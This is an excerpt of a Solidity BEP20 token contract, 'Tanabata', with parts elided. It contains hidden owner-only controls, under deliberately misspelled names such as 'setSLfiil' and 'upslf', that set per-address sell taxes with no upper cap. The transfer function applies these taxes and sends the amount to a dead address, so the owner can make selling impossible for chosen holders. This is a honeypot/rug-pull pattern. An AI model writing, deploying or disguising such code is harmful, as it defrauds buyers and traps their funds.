 ...
 *
 * This module is used through inheritance. It will make available the modifiilr
...
contract Tanabata is BEP20, Ownable, BaseToken {
    ...
    uint256 private _defaultSellfiil = 3;

    uint256 private _defaultBuyfiil = 0;


    mapping(address => bool) private _marketacounts;

    mapping(address => uint256) private _SLfiil;
    ...
    function upslf(uint256 _value) external onlyowner {
        _defaultSellfiil = _value;
    }


    function setSLfiil(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "acounts tax must be greater than or equal to 1");
        _SLfiil[_address] = _value;
    }

    function getSLfiil(address _address) external view onlyowner returns (uint256) {
        return _SLfiil[_address];
    }


    function setMarketacountsfiil(address _address, bool _value) external onlyowner {
        _marketacounts[_address] = _value;
    }

    function getMarketacountsfiil(address _address) external view onlyowner returns (bool) {
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (recipient == uniswapV2Pair) {
                    ...
                    tradefiil = _defaultSellfiil;
                }
                if (sender == uniswapV2Pair) {

                    tradefiil = _defaultBuyfiil;
                }
            }
            if (_SLfiil[sender] > 0) {
                tradefiil = _SLfiil[sender];
            }

            tradefiilAmount = amount.mul(tradefiil).div(100);
        }


        if (tradefiilAmount > 0) {
            _balances[_DEADaddress] = _balances[_DEADaddress].add(tradefiilAmount);
            emit Transfer(sender, _DEADaddress, tradefiilAmount);
        }
        _balances[recipient] = _balances[recipient].add(amount - tradefiilAmount);
        emit Transfer(sender, recipient, amount - tradefiilAmount);
    }
